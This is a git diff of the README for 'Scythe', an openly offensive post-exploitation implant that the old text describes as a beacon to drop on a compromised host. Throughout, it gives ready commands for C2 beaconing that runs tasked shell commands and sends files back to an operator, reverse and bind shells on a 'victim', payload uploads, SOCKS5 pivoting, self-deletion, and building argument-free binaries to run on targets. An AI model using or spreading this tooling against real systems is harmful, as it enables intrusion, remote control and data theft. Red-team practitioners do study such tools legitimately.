@@ -1,60 +1,372 @@
 # Scythe
-All in one beacon to drop on a compromised host
 
+Single-binary tooling for HTTP beacons, TCP pivots, file transfer, and a SOCKS5 listener. **Pure Go** (`CGO_ENABLED=0` builds are static-friendly; no extra runtime beyond the OS).
 
-## Build
-
-* Please look at github actions or just use the dockerfile to build for your platform.
-
-### Embedded arguments
-
-You can compile subcommand and flags into the binary so it runs with **no command-line arguments** (e.g. `./Scythe.embedded` only). The same tokens are used as after the program name today: a JSON array of strings.
-
-The embedded payload is just data inside the executable; **the executable must match the OS and CPU you run it on.** Build on your dev machine and pass a **target OS** to produce a standalone binary for Linux, Windows, or macOS without needing that OS locally as the build host (Go cross-compiles).
-
-**Using the helper script** (from the repo root):
+**Requirements:** Go **1.23+** (see `go.mod`). Builds from `./cmd`.
 
 ```bash
-./scripts/build-embedded.sh '["Http","-url","https://example.com/api","-timeout","30s"]' ./Scythe.embedded
-./scripts/build-embedded.sh '["Netcat","-reverse","-address","10.0.0.1","-port","4444","-tls"]'
+cd cmd && CGO_ENABLED=0 go build -o Scythe .
+./Scythe Http -h
 ```
 
-Optional **third argument** — `linux`, `windows`, or `darwin` (aliases: `macos` for Darwin): sets `GOOS` for a cross-compile. Optional **fourth argument** — CPU / architecture (mapped to Go’s `GOARCH`). If you omit the fourth argument when cross-compiling, `GOARCH` defaults to **`amd64`** unless you set the **`GOARCH`** environment variable (e.g. `GOARCH=arm64 ./scripts/build-embedded.sh … linux`). `CGO_ENABLED=0` is set for cross-builds.
+---
 
-Common **architecture names** (case-insensitive):
+## Subcommands
 
-| You pass | Go `GOARCH` |
-|----------|-------------|
-| `amd64`, `x86_64`, `x64` | `amd64` |
-| `386`, `x86`, `i386`, `i686` | `386` |
-| `arm`, `armv7`, `armv7l` | `arm` |
-| `arm64`, `aarch64` | `arm64` |
-| `riscv64`, `ppc64le` | same |
+| Subcommand | Role |
+|------------|------|
+| **Http** | HTTP client: poll a URL on an interval, parse JSON tasking, post results. Optional SOCKS5. |
+| **Netcat** | Reverse/bind shells, listener, TLS, optional SOCKS5 pivot. |
+| **FileTransfer** | TCP client/server file send/receive (TLS optional). |
+| **Proxy** | SOCKS5 proxy server (listen). |
+| **Scanner** | Placeholder (not documented here). |
 
-Other lowercase names without extra punctuation may be passed through to `go build` (e.g. `riscv64`).
+---
+
+## Http
+
+The Http mode drives C2-style check-ins: it issues requests to `-url` (with optional `-directories` path suffixes), reads JSON bodies, runs **built-in** or **shell** commands from a `Commands` array, and POSTs output to `-url/receive` (and `/receive/<uuid>` when a UUID appears in the directory path).
+
+### Flags
+
+| Flag | Meaning |
+|------|---------|
+| `-url` | Base URL (required). |
+| `-method` | HTTP method (default `GET`). |
+| `-timeout` | Request timeout and **poll interval** (e.g. `5s`, `30s`). |
+| `-headers` | Comma-separated `key:value` pairs (values may need care if they contain commas—use Python JSON for embedded builds). |
+| `-body` | JSON or string body for non-GET requests. |
+| `-directories` | Comma-separated path fragments appended to `-url` (one chosen at random per request if multiple). |
+| `-skip-tls-verify` | Skip TLS certificate verification. |
+| `-proxy` | SOCKS5 proxy `host:port`; traffic to `-url` uses this dialer. |
+
+### Examples (Http)
+
+**1. Minimal check-in** (replace host, port, and UUIDs with yours):
 
 ```bash
-./scripts/build-embedded.sh '["Http","-url","https://example.com/api","-timeout","30s"]' ./Scythe.exe windows amd64
-./scripts/build-embedded.sh '["Netcat","-reverse","-address","10.0.0.1","-port","4444","-tls"]' ./Scythe.bin linux x86_64
-./scripts/build-embedded.sh '["Proxy","-port","9050"]' ./Scythe.arm64 darwin arm64
-./scripts/build-embedded.sh '["Proxy","-port","9050"]' ./Scythe-linux-arm linux arm
-GOARCH=arm64 ./scripts/build-embedded.sh '["Proxy","-port","9050"]' ./Scythe.arm64-linux linux   # fourth arg omitted: env sets arch
+cd cmd && CGO_ENABLED=0 go build -o Scythe .
+
+./Scythe Http \
+  -method GET \
+  -timeout 5s \
+  -url http://10.0.20.243:8080 \
+  -headers 'Content-Type:application/json,X-Client-Id:ac0390ba-8edb-4411-85bc-ddec7d9381ba,X-API-Secret:YOUR_SECRET_HERE' \
+  -directories '/heartbeat,/heartbeat/ac0390ba-8edb-4411-85bc-ddec7d9381ba'
 ```
 
-Omit the third (and fourth) argument to build for **whatever OS/arch you are running `go build` on** (native).
+The beacon polls every `-timeout` period. The server should return JSON; when it includes a `Commands` array, each item runs (built-in or `exec`).
 
-Default output filename is `./Scythe.embedded` if you omit the second argument.
-
-**Generating JSON safely (recommended for real invocations):** hand-written JSON breaks easily when `-headers` or other values contain commas, spaces, or quotes. Build the same token list you would pass on the CLI, serialize with Python, then pass the result to the script (the script base64-encodes it for `-ldflags`; you do not need to run `base64` yourself).
-
-One-liner (short example):
+**2. Http through a SOCKS5 pivot** (e.g. parent beacon or local Tor):
 
 ```bash
-JSON=$(python3 -c 'import json; print(json.dumps(["Http","-timeout","5s","-url","http://127.0.0.1:8080","-headers","Content-Type:application/json,X-Client-Id:abc"]))'
-./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
+./Scythe Http -method GET -timeout 10s -url https://c2.example.com:443 \
+  -headers 'Content-Type:application/json,X-Client-Id:YOUR-UUID' \
+  -directories '/heartbeat,/heartbeat/YOUR-UUID' \
+  -proxy 127.0.0.1:9050 \
+  -skip-tls-verify
 ```
 
-Long values (e.g. full `User-Agent`, multiple headers): use a small heredoc so the strings stay readable:
+**3. What the C2 might return** (illustrative)—mixed built-ins and a shell command:
+
+```json
+{
+  "Active": true,
+  "ClientId": "ac0390ba-8edb-4411-85bc-ddec7d9381ba",
+  "Commands": [
+    "whoami",
+    "environment",
+    "download /etc/hostname",
+    "uname -a"
+  ]
+}
+```
+
+The beacon posts stdout/stderr (or built-in output) back to `POST {base}/receive/...` for the operator to read.
+
+**4. Upload to the beacon via JSON** (must be an object in `Commands`, not a plain string):
+
+```json
+{
+  "Commands": [
+    {
+      "op": "upload",
+      "path": "/tmp/tool.sh",
+      "content_base64": "IyEvYmluL3NoCmVjaG8gaGVsbG8="
+    }
+  ]
+}
+```
+
+(`content_base64` is standard base64 of the raw file bytes.)
+
+**5. Download using only strings** (no JSON object required):
+
+```json
+{
+  "Commands": [
+    "download /var/log/syslog"
+  ]
+}
+```
+
+Output in the C2 UI will start with `SCYTHE_FILE_DOWNLOAD v1`, then headers, then one line of base64.
+
+### C2 JSON (`Commands`)
+
+Successful JSON responses may include:
+
+```json
+{
+  "Commands": [ "whoami", "download /etc/hostname" ],
+  "ClientId": "...",
+  "Active": true
+}
+```
+
+`Commands` entries may be **strings** (shell line or built-in) or **JSON objects** for structured file ops (see below). Results are posted back with the original command string (objects are serialized to JSON in the `command` field).
+
+### HTTP built-in commands (no external `whoami`/`env` binaries)
+
+Handled inside the process before `exec`. Matching is normalized (trim, quotes, invisible characters where applicable).
+
+| Token / form | Behavior |
+|----------------|----------|
+| `whoami` | Current username (`os/user`). |
+| `groups` | Group names for the current user. |
+| `env` / `environment` | Process environment (`os.Environ()`), sorted `KEY=value` lines. |
+| `download <path>` | Read **local** file on the beacon; output is text starting with `SCYTHE_FILE_DOWNLOAD v1`, metadata, then **base64** body. Max **64 MiB** (`MaxHTTPBuiltinFileBytes`). Path is everything after the first space. |
+| *(object)* | See **File upload/download via JSON** below. |
+| *(anything else)* | Passed to `exec` (argv split on whitespace)—normal shell binary name + args. |
+
+**Killswitch:** a command string exactly equal to `sendmetojesusdog` (after trim) stops the beacon and attempts **self-delete** of the binary (OS-specific; see code in `pkg/httpclient/client.go`).
+
+### File upload/download via JSON (C2 → beacon)
+
+Use **JSON objects** in `Commands` when you need to pass structured data (required for **upload**).
+
+**Download (object form):**
+
+```json
+{"op": "download", "path": "/etc/hostname"}
+```
+
+or shorthand:
+
+```json
+{"download": "/etc/hostname"}
+```
+
+**Upload:**
+
+```json
+{
+  "op": "upload",
+  "path": "/tmp/payload.sh",
+  "content_base64": "IyEvYmluL3No..."
+}
+```
+
+or, if `path` + `content_base64` are both set:
+
+```json
+{"path": "/tmp/x", "content_base64": "..."}
+```
+
+`contentBase64` (camelCase) is also accepted. Parent directories are created as needed; files are written with mode `0644`.
+
+### Local testing
+
+Serve a folder and hit random paths:
+
+```bash
+cd /tmp && echo ok > index.html
+python3 -m http.server 5000 &
+./Scythe Http -method GET -timeout 3s -url http://127.0.0.1:5000 \
+  -directories /index.html,/index.html,/other
+```
+
+Stop the server with `fg` then Ctrl+C, or `kill` the `python3` job.
+
+---
+
+## Netcat
+
+Use `-proxy host:port` when you must pivot through a SOCKS5 hop.
+
+| Mode | Victim / attacker sketch |
+|------|---------------------------|
+| **Reverse** | Victim: `-reverse -address C2 -port 8000 -tls` · Attacker: `-listen -port 8000 -tls` |
+| **Bind** | Victim: `-bind -port 8000 -tls` · Attacker: `-caller -address victim -port 8000 -tls` |
+
+Flags include `-address`, `-port`, `-bind`, `-reverse`, `-caller`, `-listen`, `-tls`, `-proxy`.
+
+### Examples (Netcat)
+
+**Reverse shell — victim** connects out to the attacker listener at `172.17.0.2:8000`:
+
+```bash
+./Scythe Netcat -reverse -address 172.17.0.2 -port 8000 -tls
+```
+
+**Reverse shell — attacker** listens:
+
+```bash
+./Scythe Netcat -listen -port 8000 -tls
+```
+
+Then type shell commands; the victim side runs them on its host.
+
+**Bind shell — victim** opens a listener on `:8000`:
+
+```bash
+./Scythe Netcat -bind -port 8000 -tls
+```
+
+**Bind shell — attacker** dials the victim `172.17.0.2:8000`:
+
+```bash
+./Scythe Netcat -caller -address 172.17.0.2 -port 8000 -tls
+```
+
+**Reverse through a SOCKS5 proxy** (e.g. `Proxy` on `172.17.0.2:9050`):
+
+```bash
+./Scythe Netcat -reverse -address 10.10.10.10 -port 8000 -proxy 172.17.0.2:9050 -tls
+```
+
+---
+
+## FileTransfer
+
+Standalone TCP file transfer (not the same as Http `download`/`upload` built-ins). Typical flags: `-listen`, `-send`, `-download`, `-hostname`, `-port`, `-filename`, `-tls`, `-proxy`.
+
+```bash
+./Scythe FileTransfer -h
+```
+
+### Examples (FileTransfer)
+
+Replace IPs and paths with yours. **TLS** is recommended on real networks (`-tls`).
+
+**Download — victim pulls a file** from the attacker listener:
+
+```bash
+# Attacker (listener)
+./Scythe FileTransfer -listen -port 8080 -tls
+
+# Victim (client download)
+./Scythe FileTransfer -download -filename report.pdf -hostname 10.10.10.10 -port 8080 -tls
+```
+
+**Upload — attacker pushes a file** to the victim listener:
+
+```bash
+# Victim (listener, writes incoming file)
+./Scythe FileTransfer -listen -filename incoming.exe -port 8080 -tls
+
+# Attacker (client send — set hostname to the victim / listener IP)
+./Scythe FileTransfer -send -filename payload.exe -hostname 192.168.1.50 -port 8080 -tls
+```
+
+Use the same `-port` (and `-tls`) on both sides; the sender must reach the listener’s IP/DNS via `-hostname`.
+
+---
+
+## Proxy
+
+SOCKS5 server (default listen port in code is **8181** unless you pass `-port`):
+
+```bash
+./Scythe Proxy -port 9050
+```
+
+### Examples (Proxy + Http / Netcat)
+
+**1. Start SOCKS5 on the pivot host** (`9050`):
+
+```bash
+./Scythe Proxy -port 9050
+```
+
+**2. Http beacon through the pivot** (beacon host reaches C2 via the proxy):
+
+```bash
+./Scythe Http -timeout 5s -url http://C2_HOST:8080 \
+  -headers 'Content-Type:application/json,X-Client-Id:UUID' \
+  -directories '/heartbeat,/heartbeat/UUID' \
+  -proxy PIVOT_IP:9050
+```
+
+**3. Netcat reverse through the pivot** (same idea as earlier `-proxy` example).
+
+---
+
+## Embedded builds (no CLI at runtime)
+
+You can bake the subcommand and flags into the binary at **link time** so running `./Scythe` with **no arguments** replays a full argv (e.g. Http with URL and headers). The linker sets `pkg/userinput.EmbeddedArgv` to **base64(JSON array of strings)**.
+
+- **Runtime:** if `EmbeddedArgv` is set and you start the process with **only** `argv[0]`, embedded argv is applied. If you pass any CLI arguments, normal parsing wins.
+- **Cross-compile:** third argument to the helper script = `linux` | `windows` | `darwin` (`macos` allowed); optional fourth = architecture (`amd64`, `arm64`, `x86_64`, …). `CGO_ENABLED=0` for cross-builds.
+
+### Helper script
+
+From repo root:
+
+```bash
+./scripts/build-embedded.sh '["Http","-url","https://example/api","-timeout","30s"]' ./out.bin linux amd64
+```
+
+Arguments: `JSON` · `[output path]` · `[OS]` · `[arch]`. Default output is `./Scythe.embedded`. Omit OS/arch for a **native** build.
+
+### Safe JSON for complex flags
+
+Prefer `json.dumps` so commas/quotes in `-headers` do not break:
+
+```bash
+JSON=$(python3 -c 'import json; print(json.dumps([
+  "Http","-timeout","5s","-url","http://10.0.0.1:8080",
+  "-headers","Content-Type:application/json,X-Client-Id:..."
+]))'
+./scripts/build-embedded.sh "$JSON" ./Scythe.embedded windows amd64
+```
+
+### Manual `go build`
+
+```bash
+JSON=$(python3 -c 'import json; print(json.dumps(["Http","-url","https://x","-timeout","30s"]))')
+B64=$(printf '%s' "$JSON" | base64 | tr -d '\n')
+GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -trimpath \
+  -ldflags "-X github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv=${B64}" \
+  -o Scythe.embedded ./cmd
+```
+
+Linker variable: `github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv`.
+
+### Examples (embedded)
+
+**1. Build** a Windows amd64 Http beacon with no runtime flags:
+
+```bash
+# From repo root
+./scripts/build-embedded.sh \
+  '["Http","-method","GET","-timeout","5s","-url","http://192.168.1.10:8080","-headers","Content-Type:application/json,X-Client-Id:YOUR-UUID","-directories","/heartbeat,/heartbeat/YOUR-UUID"]' \
+  ./Scythe.exe windows amd64
+```
+
+**2. Run** on the target (no arguments—the argv is inside the binary):
+
+```cmd
+Scythe.exe
+```
+
+**3. Override** for debugging (normal CLI wins over embedded):
+
+```bash
+./Scythe.embedded Http -url http://127.0.0.1:8080 -timeout 2s
+```
+
+**4. Long headers** (use a heredoc so JSON stays valid):
 
 ```bash
 JSON=$(python3 <<'PY'
@@ -65,195 +377,55 @@ print(json.dumps([
     "-url", "http://10.0.0.1:8080",
     "-directories", "/heartbeat,/heartbeat/uuid-here",
     "-headers",
-    "Content-Type:application/json,X-Client-Id:...,X-API-Secret:...,User-Agent:Mozilla/5.0 ...",
+    "Content-Type:application/json,X-Client-Id:uuid,X-API-Secret:secret,User-Agent:CustomAgent/1.0",
 ]))
 PY
 )
-./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
+./scripts/build-embedded.sh "$JSON" ./Scythe.embedded linux amd64
 ```
 
-**Network subcommands (Netcat, FileTransfer, Proxy):** same idea—embed the exact token list you would pass after `./Scythe` (addresses, ports, `-tls`, `-proxy`, etc.). Use Python whenever a value is awkward to quote in JSON.
-
-Helper script (inline JSON):
+**5. Netcat reverse embedded** (example):
 
 ```bash
-./scripts/build-embedded.sh '["Proxy","-port","9050"]' ./Scythe.embedded
-./scripts/build-embedded.sh '["Netcat","-reverse","-address","10.0.0.1","-port","4444","-tls"]' ./Scythe.embedded
-./scripts/build-embedded.sh '["FileTransfer","-listen","-port","8080","-filename","payload.bin","-tls"]' ./Scythe.embedded
+./scripts/build-embedded.sh \
+  '["Netcat","-reverse","-address","10.0.0.5","-port","4444","-tls"]' \
+  ./nc-embedded linux amd64
 ```
 
-One-liner (Netcat reverse with SOCKS5):
+---
+
+## Docker
+
+`Dockerfile` installs Go and `ca-certificates`, then cross-builds Linux/Windows/Darwin binaries from `./cmd`. Requires network for module download during build.
 
 ```bash
-JSON=$(python3 -c 'import json; print(json.dumps(["Netcat","-reverse","-address","10.10.10.10","-port","8000","-proxy","127.0.0.1:9050","-tls"]))'
-./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
+docker build -t scythe .
 ```
 
-Longer network argv (paths, hostnames, proxy): heredoc keeps flags readable:
+---
 
-```bash
-JSON=$(python3 <<'PY'
-import json
-print(json.dumps([
-    "FileTransfer",
-    "-download",
-    "-filename", "somebadfile.exe",
-    "-hostname", "10.10.10.10",
-    "-port", "8080",
-    "-proxy", "172.17.0.2:1080",
-    "-tls",
-]))
-PY
-)
-./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
-```
+## CI
 
-**Manual `go build`:** take the same `JSON` variable as above (Http or network), then base64 (no newlines) and link. For a **non-native** OS/arch, set `GOOS`, `GOARCH`, and `CGO_ENABLED=0`:
+GitHub Actions (`.github/workflows/go.yml`) builds the Linux amd64 binary from `cmd/`. Align the workflow Go version with `go.mod` when you bump the toolchain.
 
-```bash
-JSON=$(python3 -c 'import json; print(json.dumps(["Http","-url","https://example.com","-timeout","30s"]))')
-B64=$(printf '%s' "$JSON" | base64 | tr -d '\n')
-GOOS=linux GOARCH=arm64 CGO_ENABLED=0 go build -trimpath \
-  -ldflags "-X github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv=${B64}" \
-  -o Scythe-linux-arm64 ./cmd
-```
+---
 
-```bash
-GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -trimpath \
-  -ldflags "-X github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv=${B64}" \
-  -o Scythe.exe ./cmd
-```
+## ReaperC2
 
-Native build (omit `GOOS` / `GOARCH` or set them to match your machine):
+[ReaperC2](https://github.com/BuildAndDestroy/ReaperC2) can drive Scythe over Http. It vendors Scythe under **`third_party/Scythe`** as a **git submodule**.
 
-```bash
-go build -trimpath \
-  -ldflags "-X github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv=${B64}" \
-  -o Scythe.embedded ./cmd
-```
+1. **Initialize the submodule** before building images or using “Download Scythe.embedded”:
 
-**Runtime:** run the binary with no extra arguments to use the embedded argv. If you invoke it with any arguments (e.g. `./Scythe.embedded Http -url …`), those are used instead and embedded defaults are ignored.
+   ```bash
+   git submodule update --init --recursive
+   ```
 
-## Netcat
+2. **Keep the submodule on a commit** that includes the Http features you need (built-ins, `download`/`upload`, etc.). If you see errors like `exec: "environment": executable file not found`, the running beacon was almost certainly built from an **old** Scythe submodule—update the submodule, rebuild, redeploy.
 
-Remember to use --proxy if you plan to pivot between hosts
+3. **String vs JSON `Commands`:** plain strings work for `whoami`, `download /path`, etc. **Upload** and object-style **download** require **`Commands` array elements that are JSON objects**. If the C2 only queues strings, extend it to push structured documents (MongoDB arrays can hold mixed types). Plain `download /path` does not require C2 changes.
 
-### Reverse Shell
+---
 
-* Victim:
+## License
 
-```
-root@f44b79805a1e:~/cmd# ./ScytheLinux Netcat --address 172.17.0.2 --reverse --port 8000 --tls
-2024/06/13 22:45:18 [*] Rev shell spawning, connecting to 172.17.0.2:8000
-2024/06/13 22:45:18 Linux
-
-```
-
-* Attacker:
-
-```
-root@fcbc11f4beba:~/cmd# ./ScytheLinux Netcat --listen --port 8000 --tls 
-2024/06/13 22:45:06 Listener opened on :8000
-2024/06/13 22:45:09 Received connection from 172.17.0.3:57398!
-whoami
-root
-
-```
-
-### Bind Shell:
-
-* Victim:
-
-```
-root@fcbc11f4beba:~/cmd# ./ScytheLinux Netcat --bind --port 8000 --tls
-2024/06/13 22:45:57 [*] Binding shell spawning for remote code execution
-2024/06/13 22:46:02 Received connection from 172.17.0.3:49050!
-
-```
-
-* Attacker:
-
-```
-root@f44b79805a1e:~/cmd# ./ScytheLinux Netcat --address 172.17.0.2 --caller --port 8000 --tls
-2024/06/13 22:46:02 [*] Bind shell spawning, connecting to 172.17.0.2:8000
-whoami
-root
-
-```
-
-## File Transfer
-
-### Download
-
-* Victim
-
-```
-./Scythe.exe FileTransfer --download --filename somebadfile.exe --hostname 10.10.10.10 --port 8080 --tls
-```
-
-* Attacker
-
-```
-./Scythe FileTransfer --listen --port 8080 --tls
-```
-
-
-### Upload
-
-* Attacker
-
-```
-./Scythe.exe FileTransfer --filename somebadfile.exe --port 8080 --send --tls
-```
-
-* Victim
-
-```
-./Scythe.exe FileTransfer --listen --filename somebadfile.exe --port 8080 --tls
-```
-
-## Proxy
-
-* Proxy server
-
-```
-./Scythe Proxy --port 9050
-```
-
-* Victim Reverse Shell
-
-```
-./Scythe.exe Netcat --address 10.10.10.10 --reverse --port 8000 --proxy 172.17.0.2 --tls
-```
-
-* Attacker
-
-```
-./ScytheLinux Netcat --listen --port 8000 --tls
-```
-
-## HTTP
-
-### HTTP Test Server
-
-* Use this to test your HTTP requests.
-
-```
-virtualenv -p python3 ~/development/virtual_env/flask
-source ~/development/virtual_env/flask/bin/activate
-pip install flask
-python3 -m http.server
-```
-
-* Use this command to test different requests
-* Spin up a Listener and Proxy if you want to test those features
-
-```
-./Scythe Http --method GET --timeout 5s --url http://127.0.0.1:5000 --directories /index.js,/index.html,/first-dir/index.js,/first-dir/index.html,/command.js,/server.py,/first-dir/dir.js/server.py,/requirements.py
-```
-
-### HTTP beacon built-ins (no shell, no `exec` of the Unix tool names)
-
-When the C2 JSON response includes a `Commands` array (e.g. from [ReaperC2](https://github.com/BuildAndDestroy/ReaperC2)), each string is handled inside the Scythe process: **`whoami`**, **`groups`**, **`env`**, and **`environment`** use Go’s **`os/user`** and **`os.Environ()`** only (same *idea* as in-process BOF-style work: no reliance on `/usr/bin/env`, `cmd.exe`, or a shell). They are matched case-insensitively after trimming; surrounding `"` / `'` / smart quotes are stripped if the whole token is wrapped that way.
-
-**ReaperC2:** the admin **Download Scythe.embedded** build uses the **`third_party/Scythe` git submodule**. If you still see `exec: "environment": executable file not found`, the submodule is almost certainly pinned to an **old Scythe** without these built-ins. From the ReaperC2 repo root run `git submodule update --init --recursive`, pull this submodule to the commit that contains the built-in commands, then regenerate the embedded binary (or build Scythe from this repo directly).
+See `LICENSE` in the repository.
